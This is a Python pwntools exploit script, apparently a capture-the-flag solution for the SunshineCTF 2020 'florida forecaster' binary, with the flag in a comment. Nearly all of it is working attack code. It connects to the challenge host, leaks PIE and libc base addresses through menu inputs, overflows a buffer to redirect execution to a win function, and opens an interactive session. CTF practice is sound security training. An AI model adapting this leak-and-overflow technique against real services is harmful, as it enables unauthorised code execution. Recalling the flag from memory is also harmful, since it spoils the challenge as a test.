#exploit for florida forecaster
#sun{Fl0rida_man_w1ll_get_a_FL4G!}
from pwn import *
import time
elf = ELF("./florida_forecaster")
context.binary=elf
libc=elf.libc
target=remote('chal.2020.sunshinectf.org',20002)

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def attack(payload):
	sla("Choice: ",str(2))
	sa("data\n",payload)
	target.recvuntil("data: ")
	leaks=target.recvline()
	sla("(y/n)?","y")
	return leaks

def leaks1(p2=0xc0c00000,p1=0xc0c0):
	sla("Choice: ",str(3))
	sla("(integer): ",str(p1))
	sla("(integer): ",str(p2))
	leaks=target.recvline().strip("\n")
	return leaks
	
def leaks2(p1=0xc0c3,p2=0xc0c00000):
	sla("Choice: ",str(3))
	sla("(integer): ",str(p1))
	sla("(integer): ",str(p2))
	target.recvuntil("Florida man ")
	leaks=target.recvline().strip("\n")
	return leaks
	
pie_base=int(leaks1()[2:],16)-0x1369
win=pie_base+0x128d
print("[+] Pie base="+hex(pie_base))
libc_base=u64(leaks2().ljust(8,"\x00"))-libc.sym["_IO_2_1_stderr_"]
print("[+] Libc base="+hex(libc_base))
payload="A"*0x90+p64(win)+p64(1)
sla("Choice: ",str(2))
sa("data\n",payload)
target.interactive()
